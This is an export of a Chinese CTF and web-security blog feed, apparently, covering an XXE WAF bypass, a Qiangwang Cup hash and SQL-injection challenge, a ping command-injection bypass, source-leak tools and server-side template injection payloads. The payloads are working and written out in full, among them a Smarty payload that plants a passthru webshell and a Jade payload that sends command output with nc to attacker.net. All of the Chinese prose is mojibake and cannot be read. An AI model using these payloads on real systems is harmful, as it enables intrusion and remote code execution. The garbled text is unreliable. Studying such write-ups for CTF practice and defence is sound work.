<p>å†™ä¸€ä¸ªæ–‡ä»¶ï¼Œuserså­—æ®µç›´æ¥ç”¨ç½‘é¡µç»™çš„ä¿¡æ¯å°±è¡Œï¼Œç›´æ¥ä¸Šä¼ ï¼Œå‘ç°è¿‡ä¸äº†ï¼Œæœ‰WAFï¼Œæ‰¾åˆ°äº†ä¸€ç¯‡xxeç»•WAFçš„æ–‡ç« <a href="https://xz.aliyun.com/t/4059#toc-4ï¼Œé‡Œé¢æåˆ°å¯ä»¥ç”¨ç¼–ç è¿›è¡Œç»•è¿‡" target="_blank" rel="noopener">https://xz.aliyun.com/t/4059#toc-4ï¼Œé‡Œé¢æåˆ°å¯ä»¥ç”¨ç¼–ç è¿›è¡Œç»•è¿‡</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ä¸€ä¸ªxmlæ–‡æ¡£ä¸ä»…å¯ä»¥ç”¨UTF-8ç¼–ç ï¼Œä¹Ÿå¯ä»¥ç”¨UTF-16(ä¸¤ä¸ªå˜ä½“â€Š-â€ŠBEå’ŒLE)ã€UTF-32(å››ä¸ªå˜ä½“â€Š-â€ŠBEã€LEã€2143ã€3412)å’ŒEBCDICç¼–ç ã€‚</span><br><span class="line">åœ¨è¿™ç§ç¼–ç çš„å¸®åŠ©ä¸‹ï¼Œä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼å¯ä»¥å¾ˆå®¹æ˜“åœ°ç»•è¿‡WAFï¼Œå› ä¸ºåœ¨è¿™ç§ç±»å‹çš„WAFä¸­ï¼Œæ­£åˆ™è¡¨è¾¾å¼é€šå¸¸ä»…é…ç½®ä¸ºå•å­—ç¬¦é›†ã€‚</span><br></pre></td></tr></table></figure>

<p>æŸ¥ä¸€ä¸‹linuxçš„ç¼–ç è½¬æ¢å‘½ä»¤(GBK-&gt;UTF-8ï¼‰</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iconv -f GBK -t UTF-8 file1 -o file2</span><br></pre></td></tr></table></figure>

<p>æ”¹ä¸€ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iconv -f utf-8 -t utf-16 file1&gt;file2</span><br></pre></td></tr></table></figure>

<p>å°†è½¬æ¢å®Œçš„æ–‡ä»¶ä¸Šä¼ </p>
<img src="/2020/06/02/xxeChallenge/5.png" class="">]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>å¼ºç½‘æ¯</title>
    <url>/2020/08/29/%E5%BC%BA%E7%BD%91%E6%9D%AF/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€<a id="more"></a></h2><p>å¼ºç½‘å…ˆé”‹çš„webè¿˜å¥½ï¼Œå•ç‹¬åˆ†ç±»çš„webå¤ªéš¾äº†ï¼Œæ˜¯è‡ªå·±å¤ªèœäº†â€¦</p>
<h1 id="Funhash"><a href="#Funhash" class="headerlink" title="Funhash"></a>Funhash</h1><h3 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><ul>
<li>md4ç¢°æ’</li>
<li>MD5ç»•è¿‡</li>
<li>sqlæ³¨å…¥ä¸­çš„md5</li>
</ul>
<h3 id="è§£é¢˜æ­¥éª¤"><a href="#è§£é¢˜æ­¥éª¤" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'conn.php'</span>;</span><br><span class="line">highlight_file(<span class="string">"index.php"</span>);</span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">"hash1"</span>] != hash(<span class="string">"md4"</span>, $_GET[<span class="string">"hash1"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'level 1 failed'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'hash2'</span>] === $_GET[<span class="string">'hash3'</span>] || md5($_GET[<span class="string">'hash2'</span>]) !== md5($_GET[<span class="string">'hash3'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'level 2 failed'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//level 3</span></span><br><span class="line">$query = <span class="string">"SELECT * FROM flag WHERE password = '"</span> . md5($_GET[<span class="string">"hash4"</span>],<span class="keyword">true</span>) . <span class="string">"'"</span>;</span><br><span class="line">$result = $mysqli-&gt;query($query);</span><br><span class="line">$row = $result-&gt;fetch_assoc(); </span><br><span class="line">var_dump($row);</span><br><span class="line">$result-&gt;free();</span><br><span class="line">$mysqli-&gt;close();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>LEVEL1</p>
<p>æ‰¾æ–‡ç« <a href="https://crdx.org/post/hsctf-2019-md5-minus-minus" target="_blank" rel="noopener">https://crdx.org/post/hsctf-2019-md5-minus-minus</a></p>
<p>exp</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$i = <span class="number">0</span>;</span><br><span class="line">$c = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> ((++$c % <span class="number">1000000</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        printf(<span class="string">"."</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $n = <span class="string">"0e"</span> . $i++;</span><br><span class="line">    $h = hash(<span class="string">'md4'</span>, $n);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($n == $h) &#123;</span><br><span class="line">        printf(<span class="string">"\nFound: $n\n"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#Found: 0e251288019</span></span><br></pre></td></tr></table></figure>

<p>LEVEL2</p>
<p>è¿™ä¸€æ­¥å¾ˆç®€å•æ•°ç»„ç»•è¿‡å³å¯</p>
<p>LEVEL3</p>
<p>è¦è®©<code>&quot;.md5($pass,true).&quot;</code>ä¸ºtrue</p>
<p>è¿™ç¯‡æ–‡ç« å™è¿°è¯¦ç»†<a href="https://www.pianshen.com/article/789754585/" target="_blank" rel="noopener">https://www.pianshen.com/article/789754585/</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#exp</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>;;) &#123; </span><br><span class="line"> <span class="keyword">for</span> ($c = <span class="number">0</span>; $c &lt; <span class="number">1000000</span>; $c++, $i++)</span><br><span class="line">  <span class="keyword">if</span> (stripos(md5($i, <span class="keyword">true</span>), <span class="string">'\'or\''</span>) !== <span class="keyword">false</span>)</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"\nmd5($i) = "</span> . md5($i, <span class="keyword">true</span>) . <span class="string">"\n"</span>;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">"."</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#content: ffifdyop</span></span><br><span class="line"><span class="comment">#hex: 276f722736c95d99e921722cf9ed621c</span></span><br><span class="line"><span class="comment">#raw: 'or'6\xc9]\x99\xe9!r,\xf9\xedb\x1c</span></span><br><span class="line"><span class="comment">#string: 'or'6]!r,b</span></span><br></pre></td></tr></table></figure>

<p>æœ€åçš„payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hash1&#x3D;0e251288019&amp;hash2[]&#x3D;1&amp;hash3[]&#x3D;2&amp;hash4&#x3D;ffifdyop</span><br></pre></td></tr></table></figure>

<img src="/2020/08/29/%E5%BC%BA%E7%BD%91%E6%9D%AF/1.png" class="">

<h2 id="ä¸»åŠ¨"><a href="#ä¸»åŠ¨" class="headerlink" title="ä¸»åŠ¨"></a>ä¸»åŠ¨</h2><h3 id="çŸ¥è¯†ç‚¹-1"><a href="#çŸ¥è¯†ç‚¹-1" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><ul>
<li>ç»•è¿‡flagè¿‡æ»¤</li>
</ul>
<h3 id="è§£é¢˜æ­¥éª¤-1"><a href="#è§£é¢˜æ­¥éª¤-1" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="string">"index.php"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/flag/i"</span>, $_GET[<span class="string">"ip"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"no flag"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">system(<span class="string">"ping -c 3 $_GET[ip]"</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1|ls</span><br></pre></td></tr></table></figure>

<p>çœ‹ä¸€ä¸‹å½“å‰ç›®å½•æ–‡ä»¶ï¼Œflag.phpå’Œindex.php</p>
<p>ç”¨ä¹‹å‰é‡åˆ°è¿‡çš„é¢˜ç›®çš„payloadå³å¯ï¼Œ$IFS$9ç»•è¿‡ç©ºæ ¼</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1;a&#x3D;g;ca\t$IFS$9fla$a.php</span><br></pre></td></tr></table></figure>

<p>ç¯å¢ƒå…³äº†ï¼Œå°±æŒ‚ä¸äº†å‡ºflagçš„å›¾äº†</p>
]]></content>
      <tags>
        <tag>å¼ºç½‘æ¯</tag>
      </tags>
  </entry>
  <entry>
    <title>ä¿¡æ¯æ³„éœ²</title>
    <url>/2020/03/14/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/</url>
    <content><![CDATA[<h4 id="0x01ï¼š-hgæºç æ³„æ¼"><a href="#0x01ï¼š-hgæºç æ³„æ¼" class="headerlink" title="0x01ï¼š.hgæºç æ³„æ¼ "></a><strong>0x01ï¼š.hgæºç æ³„æ¼</strong> <a id="more"></a></h4><p>æ¼æ´æˆå› ï¼šhg init çš„æ—¶å€™ä¼šç”Ÿæˆ.hg</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">e.g.http:&#x2F;&#x2F;www.example.com&#x2F;.hg&#x2F;</span><br></pre></td></tr></table></figure>

<p>æ¼æ´åˆ©ç”¨:dvcs-ripper</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rip -hg.pl -v -u http:&#x2F;&#x2F;www.example.com&#x2F;.hg&#x2F;</span><br></pre></td></tr></table></figure>

<h4 id="0x02-gitæºç æ³„æ¼"><a href="#0x02-gitæºç æ³„æ¼" class="headerlink" title="0x02: .gitæºç æ³„æ¼"></a>0x02: .gitæºç æ³„æ¼</h4><p>æ¼æ´æˆå› ï¼šåœ¨è¿è¡Œgit initåˆå§‹åŒ–ä»£ç åº“çš„æ—¶å€™ï¼Œä¼šåœ¨å½“å‰ç›®å½•ä¸‹é¢äº§ç”Ÿä¸€ä¸ª.gitçš„éšè—æ–‡ä»¶ï¼Œç”¨æ¥è®°å½•ä»£ç çš„å˜æ›´è®°å½•ç­‰ç­‰ã€‚åœ¨å‘å¸ƒä»£ç çš„æ—¶å€™ï¼ŒæŠŠ.gitè¿™ä¸ªç›®å½•æ²¡æœ‰åˆ é™¤ï¼Œç›´æ¥å‘å¸ƒäº†ã€‚ä½¿ç”¨è¿™ä¸ªæ–‡ä»¶ï¼Œå¯ä»¥ç”¨æ¥æ¢å¤æºä»£ç ã€‚</p>
<p>æ¼æ´åˆ©ç”¨:GitHack</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GitHack.py http:&#x2F;&#x2F;www.example.com&#x2F;.git&#x2F;</span><br></pre></td></tr></table></figure>

<h4 id="0x03-DS-Storeæ–‡ä»¶æ³„æ¼"><a href="#0x03-DS-Storeæ–‡ä»¶æ³„æ¼" class="headerlink" title="0x03:  .DS_Storeæ–‡ä»¶æ³„æ¼"></a>0x03:  .DS_Storeæ–‡ä»¶æ³„æ¼</h4><p>æ¼æ´æˆå› :åœ¨å‘å¸ƒä»£ç æ—¶æœªåˆ é™¤æ–‡ä»¶å¤¹ä¸­éšè—çš„.DS_store,è¢«å‘ç°åï¼Œè·å–æ•æ„Ÿä¿¡æ¯.</p>
<p>æ¼æ´åˆ©ç”¨:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.example.com&#x2F;.ds_store</span><br></pre></td></tr></table></figure>

<p>å·¥å…·:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dsstoreexp</span><br><span class="line">python ds_store_exp.py http:&#x2F;&#x2F;www.example.com&#x2F;.DS_Store</span><br></pre></td></tr></table></figure>

<h4 id="0x04-ç½‘ç«™å¤‡ä»½å‹ç¼©æ–‡ä»¶"><a href="#0x04-ç½‘ç«™å¤‡ä»½å‹ç¼©æ–‡ä»¶" class="headerlink" title="0x04:ç½‘ç«™å¤‡ä»½å‹ç¼©æ–‡ä»¶"></a>0x04:ç½‘ç«™å¤‡ä»½å‹ç¼©æ–‡ä»¶</h4><p>å½“å¤‡ä»½æ–‡ä»¶æˆ–è€…ä¿®æ”¹è¿‡ç¨‹ä¸­çš„ç¼“å­˜æ–‡ä»¶å› ä¸ºå„ç§åŸå› è€Œè¢«ç•™åœ¨ç½‘ç«™webç›®å½•ä¸‹ï¼Œè€Œè¯¥ç›®å½•åˆæ²¡æœ‰è®¾ç½®è®¿é—®æƒé™æ—¶ï¼Œä¾¿æœ‰å¯èƒ½å¯¼è‡´å¤‡ä»½æ–‡ä»¶æˆ–è€…ç¼–è¾‘å™¨çš„ç¼“å­˜æ–‡ä»¶è¢«ä¸‹è½½ï¼Œå¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œç»™æœåŠ¡å™¨çš„å®‰å…¨åŸ‹ä¸‹éšæ‚£ã€‚</p>
<p>æ¼æ´æˆå› ï¼š</p>
<ul>
<li>æœåŠ¡å™¨ç®¡ç†å‘˜é”™è¯¯åœ°å°†ç½‘ç«™æˆ–è€…ç½‘é¡µçš„å¤‡ä»½æ–‡ä»¶æ”¾ç½®åˆ°æœåŠ¡å™¨webç›®å½•ä¸‹ã€‚</li>
<li>ç¼–è¾‘å™¨åœ¨ä½¿ç”¨è¿‡ç¨‹ä¸­è‡ªåŠ¨ä¿å­˜çš„å¤‡ä»½æ–‡ä»¶æˆ–è€…ä¸´æ—¶æ–‡ä»¶å› ä¸ºå„ç§åŸå› æ²¡æœ‰è¢«åˆ é™¤è€Œä¿å­˜åœ¨webç›®å½•ä¸‹ã€‚</li>
</ul>
<p>æ¼æ´æµ‹è¯•ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.rar</span><br><span class="line">.zip</span><br><span class="line">.7z</span><br><span class="line">.tar.gz</span><br><span class="line">.bak</span><br><span class="line">.swp</span><br><span class="line">.txt</span><br><span class="line">.html</span><br></pre></td></tr></table></figure>

<h4 id="0x05-SVNæ–‡ä»¶æ³„æ¼"><a href="#0x05-SVNæ–‡ä»¶æ³„æ¼" class="headerlink" title="0x05:SVNæ–‡ä»¶æ³„æ¼"></a>0x05:SVNæ–‡ä»¶æ³„æ¼</h4><p>æ¼æ´åˆ©ç”¨ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dvcs-ripper</span><br><span class="line">rip-svn.pl -v -u http:&#x2F;&#x2F;www.example.com&#x2F;.svn&#x2F;</span><br></pre></td></tr></table></figure>

<h4 id="0x06ï¼šWEB-INF-web-xmlæ³„æ¼"><a href="#0x06ï¼šWEB-INF-web-xmlæ³„æ¼" class="headerlink" title="0x06ï¼šWEB-INF/web.xmlæ³„æ¼"></a>0x06ï¼šWEB-INF/web.xmlæ³„æ¼</h4><p>WEB-INFæ˜¯Javaçš„WEBåº”ç”¨çš„å®‰å…¨ç›®å½•ã€‚å¦‚æœæƒ³åœ¨é¡µé¢ä¸­ç›´æ¥è®¿é—®å…¶ä¸­çš„æ–‡ä»¶ï¼Œå¿…é¡»é€šè¿‡web.xmlæ–‡ä»¶å¯¹è¦è®¿é—®çš„æ–‡ä»¶è¿›è¡Œç›¸åº”æ˜ å°„æ‰èƒ½è®¿é—®ã€‚</p>
<p>WEB-INFä¸»è¦æ–‡ä»¶æˆ–ç›®å½•ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;WEB-INF&#x2F;web.xmlï¼šWebåº”ç”¨ç¨‹åºé…ç½®æ–‡ä»¶ï¼Œæè¿°äº† servlet å’Œå…¶ä»–çš„åº”ç”¨ç»„ä»¶é…ç½®åŠå‘½åè§„åˆ™ã€‚</span><br><span class="line">&#x2F;WEB-INF&#x2F;classes&#x2F;ï¼šå«äº†ç«™ç‚¹æ‰€æœ‰ç”¨çš„ class æ–‡ä»¶ï¼ŒåŒ…æ‹¬ servlet class å’Œéservlet classï¼Œä»–ä»¬ä¸èƒ½åŒ…å«åœ¨ .jaræ–‡ä»¶ä¸­</span><br><span class="line">&#x2F;WEB-INF&#x2F;lib&#x2F;ï¼šå­˜æ”¾webåº”ç”¨éœ€è¦çš„å„ç§JARæ–‡ä»¶ï¼Œæ”¾ç½®ä»…åœ¨è¿™ä¸ªåº”ç”¨ä¸­è¦æ±‚ä½¿ç”¨çš„jaræ–‡ä»¶,å¦‚æ•°æ®åº“é©±åŠ¨jaræ–‡ä»¶</span><br><span class="line">&#x2F;WEB-INF&#x2F;src&#x2F;ï¼šæºç ç›®å½•ï¼ŒæŒ‰ç…§åŒ…åç»“æ„æ”¾ç½®å„ä¸ªjavaæ–‡ä»¶ã€‚</span><br><span class="line">&#x2F;WEB-INF&#x2F;database.propertiesï¼šæ•°æ®åº“é…ç½®æ–‡ä»¶</span><br></pre></td></tr></table></figure>

<p>æ¼æ´åˆ©ç”¨ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">é€šè¿‡æ‰¾åˆ°web.xmlæ–‡ä»¶ï¼Œæ¨æ–­classæ–‡ä»¶çš„è·¯å¾„ï¼Œæœ€åç›´æ¥classæ–‡ä»¶ï¼Œåœ¨é€šè¿‡åç¼–è¯‘classæ–‡ä»¶ï¼Œå¾—åˆ°ç½‘ç«™æºç ã€‚</span><br></pre></td></tr></table></figure>

<p>0x07ï¼šCVSæ³„æ¼</p>
<p>æ¼æ´åˆ©ç”¨:</p>
<p>å–å›æºç ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bk clone http:&#x2F;&#x2F;url&#x2F;name dir&#x2F;&#x2F;è¿™ä¸ªå‘½ä»¤çš„æ„æ€å°±æ˜¯æŠŠè¿œç«¯ä¸€ä¸ªåä¸ºnameçš„repo cloneåˆ°æœ¬åœ°åä¸ºdirçš„ç›®å½•ä¸‹ã€‚</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bk changes</span><br><span class="line">Bazaar&#x2F;bzr</span><br><span class="line">&#x2F;&#x2F;æŸ¥çœ‹æ‰€æœ‰çš„æ”¹å˜çš„å‘½ä»¤ï¼Œè½¬åˆ°downloadçš„ç›®å½•</span><br></pre></td></tr></table></figure>

<p>å·¥å…·ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dvcs-ripper</span><br><span class="line">rip-bzr.pl -v -u http:&#x2F;&#x2F;www.example.com&#x2F;.bzr&#x2F;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>æ•æ„Ÿä¿¡æ¯</tag>
      </tags>
  </entry>
  <entry>
    <title>æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥</title>
    <url>/2020/02/12/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h4 id="0x01-ç®€ä»‹"><a href="#0x01-ç®€ä»‹" class="headerlink" title="0x01:ç®€ä»‹"></a>0x01:ç®€ä»‹<a id="more"></a></h4><p>æ¨¡æ¿å¼•æ“ç”¨äºä½¿ç”¨åŠ¨æ€æ•°æ®å‘ˆç°å†…å®¹ã€‚æ­¤ä¸Šä¸‹æ–‡æ•°æ®é€šå¸¸ç”±ç”¨æˆ·æ§åˆ¶å¹¶ç”±æ¨¡æ¿è¿›è¡Œæ ¼å¼åŒ–ï¼Œä»¥ç”Ÿæˆç½‘é¡µã€ç”µå­é‚®ä»¶ç­‰ã€‚æ¨¡æ¿å¼•æ“é€šè¿‡ä½¿ç”¨ä»£ç æ„é€ ï¼ˆå¦‚æ¡ä»¶è¯­å¥ã€å¾ªç¯ç­‰ï¼‰å¤„ç†ä¸Šä¸‹æ–‡æ•°æ®ï¼Œå…è®¸åœ¨æ¨¡æ¿ä¸­ä½¿ç”¨å¼ºå¤§çš„è¯­è¨€è¡¨è¾¾å¼ï¼Œä»¥å‘ˆç°åŠ¨æ€å†…å®¹ã€‚å¦‚æœæ”»å‡»è€…èƒ½å¤Ÿæ§åˆ¶è¦å‘ˆç°çš„æ¨¡æ¿ï¼Œåˆ™ä»–ä»¬å°†èƒ½å¤Ÿæ³¨å…¥å¯æš´éœ²ä¸Šä¸‹æ–‡æ•°æ®ï¼Œç”šè‡³åœ¨æœåŠ¡å™¨ä¸Šè¿è¡Œä»»æ„å‘½ä»¤çš„è¡¨è¾¾å¼ã€‚</p>
<h4 id="0x02-æœåŠ¡ç«¯æ¨¡æ¿å¼•æ“"><a href="#0x02-æœåŠ¡ç«¯æ¨¡æ¿å¼•æ“" class="headerlink" title="0x02:æœåŠ¡ç«¯æ¨¡æ¿å¼•æ“"></a>0x02:æœåŠ¡ç«¯æ¨¡æ¿å¼•æ“</h4><p><strong>PHP</strong>ï¼šSmartyã€Twigï¼›</p>
<p><strong>Java</strong>ï¼šFreemarkerã€Velocityï¼›</p>
<p><strong>Python</strong>ï¼šJinja2ã€Tornadoã€Markoï¼›</p>
<p><strong>Ruby</strong>ï¼šSlimã€ERBï¼›</p>
<p><strong>NodeJS</strong>ï¼šJadeç­‰</p>
<h4 id="0x03ï¼šæ³¨å…¥æ‰‹æ³•ï¼ˆps-è¿™æ˜¯ä¸€å¼ æ‰¾æ¥çš„å›¾ç‰‡ï¼‰"><a href="#0x03ï¼šæ³¨å…¥æ‰‹æ³•ï¼ˆps-è¿™æ˜¯ä¸€å¼ æ‰¾æ¥çš„å›¾ç‰‡ï¼‰" class="headerlink" title="0x03ï¼šæ³¨å…¥æ‰‹æ³•ï¼ˆps:è¿™æ˜¯ä¸€å¼ æ‰¾æ¥çš„å›¾ç‰‡ï¼‰"></a>0x03ï¼šæ³¨å…¥æ‰‹æ³•ï¼ˆps:è¿™æ˜¯ä¸€å¼ æ‰¾æ¥çš„å›¾ç‰‡ï¼‰</h4><p> å¯¹äºæ¨¡æ¿æ³¨å…¥æ¼æ´çš„ç ”ç©¶å¯ä»¥å‚è€ƒSQLæ³¨å…¥ï¼Œå®¢æˆ·ç«¯çš„æ¨¡æ¿æ³¨å…¥ï¼ˆCSTIï¼‰åªèƒ½XSSï¼Œè€ŒæœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥ï¼ˆSSTIï¼‰åˆ™å¯èƒ½é€ æˆXSSã€LFIå’Œä»»æ„ä»£ç æ‰§è¡Œã€‚</p>
<p> æ¼æ´å‘ç°åŠåˆ©ç”¨æ­¥éª¤åˆ†ä¸ºï¼šæ¢æµ‹ã€åˆ¤æ–­ã€åˆ©ç”¨ï¼ˆè¯»å–ã€æ¢ç´¢ã€æ”»å‡»ï¼‰</p>
<img src="/2020/02/12/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/1.jpg" class="">



<h4 id="0x04ï¼šåˆ¤æ–­æ¼æ´"><a href="#0x04ï¼šåˆ¤æ–­æ¼æ´" class="headerlink" title="0x04ï¼šåˆ¤æ–­æ¼æ´"></a>0x04ï¼šåˆ¤æ–­æ¼æ´</h4><img src="/2020/02/12/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/2.jpeg" class="">

<p>é€šè¿‡å›¾ç‰‡ä¸­çš„payloadå¯ä»¥å¿«é€Ÿåˆ¤æ–­</p>
<p>ç»¿çº¿è¡¨ç¤ºæˆåŠŸï¼Œçº¢çº¿å¤±è´¥ã€‚49ä¼šåœ¨ Twig ä¸­è¿”å›49ï¼Œè€Œåœ¨ Jinja2 ä¸­åˆ™æ˜¯7777777</p>
<h4 id="1x01ï¼šæ”¶é›†åˆ°çš„ä¸€äº›æ¨¡æ¿æ³¨å…¥payload-å…·ä½“çš„æ¨¡æ¿å¯ä»¥è‡ªè¡Œç™¾åº¦äº†è§£"><a href="#1x01ï¼šæ”¶é›†åˆ°çš„ä¸€äº›æ¨¡æ¿æ³¨å…¥payload-å…·ä½“çš„æ¨¡æ¿å¯ä»¥è‡ªè¡Œç™¾åº¦äº†è§£" class="headerlink" title="1x01ï¼šæ”¶é›†åˆ°çš„ä¸€äº›æ¨¡æ¿æ³¨å…¥payload,å…·ä½“çš„æ¨¡æ¿å¯ä»¥è‡ªè¡Œç™¾åº¦äº†è§£"></a>1x01ï¼šæ”¶é›†åˆ°çš„ä¸€äº›æ¨¡æ¿æ³¨å…¥payload,å…·ä½“çš„æ¨¡æ¿å¯ä»¥è‡ªè¡Œç™¾åº¦äº†è§£</h4><p>FreeMakerï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload:&lt;#assign ex&#x3D;&quot;freemarker.template.utility.Execute&quot;?new()&gt; $&#123; ex(&quot;id&quot;) &#125;</span><br><span class="line">return:uid&#x3D;119(tomcat7) gid&#x3D;127(tomcat7) groups&#x3D;127(tomcat7)</span><br></pre></td></tr></table></figure>

<p>Velocity:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#set($str&#x3D;$class.inspect(&quot;java.lang.String&quot;).type)</span><br><span class="line">#set($chr&#x3D;$class.inspect(&quot;java.lang.Character&quot;).type)</span><br><span class="line">#set($ex&#x3D;$class.inspect(&quot;java.lang.Runtime&quot;).type.getRuntime().exec(&quot;whoami&quot;))</span><br><span class="line">$ex.waitFor()</span><br><span class="line">#set($out&#x3D;$ex.getInputStream())</span><br><span class="line">#foreach($i in [1..$out.available()])</span><br><span class="line">$str.valueOf($chr.toChars($out.read()))</span><br><span class="line">#end</span><br><span class="line">&#x2F;&#x2F;è¾“å‡º tomcat7</span><br></pre></td></tr></table></figure>

<p>Smarty:</p>
<p>1)å†™æ–‡ä»¶åˆ›å»ºåé—¨:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php passthru($_GET[&#39;cmd&#39;]); ?&gt;&quot;,self::clearConfig())&#125;</span><br></pre></td></tr></table></figure>

<p>2)ä»»æ„è¯»å–æ–‡ä»¶:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;self::getStreamVariable(&quot;file:&#x2F;&#x2F;&#x2F;proc&#x2F;self&#x2F;loginuid&quot;)&#125;</span><br></pre></td></tr></table></figure>

<p>Twig:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F;è¿”å›ç»“æœï¼š uid&#x3D;1000(k) gid&#x3D;1000(k) groups&#x3D;1000(k),10(wheel)</span><br></pre></td></tr></table></figure>

<p>jade:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var x &#x3D; root.process</span><br><span class="line">x &#x3D; x.mainModule.require</span><br><span class="line">x &#x3D; x(&#39;child_process&#39;)</span><br><span class="line">x.exec(&#39;id | nc attacker.net 80&#39;)</span><br></pre></td></tr></table></figure>

<p>pythonæ¨¡æ¿æ³¨å…¥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1ï¼‰</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ &#x3D;&#x3D; &#39;catch_warnings&#39; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;  </span><br><span class="line">  &#123;% if b.__class__ &#x3D;&#x3D; &#123;&#125;.__class__ %&#125;         &#x2F;&#x2F;éå†åŸºç±» æ‰¾åˆ°evalå‡½æ•°</span><br><span class="line">    &#123;% if &#39;eval&#39; in b.keys() %&#125;    &#x2F;&#x2F;æ‰¾åˆ°äº†</span><br><span class="line">      &#123;&#123; b[&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#39;) &#125;&#125;  &#x2F;&#x2F;å¯¼å…¥cmd 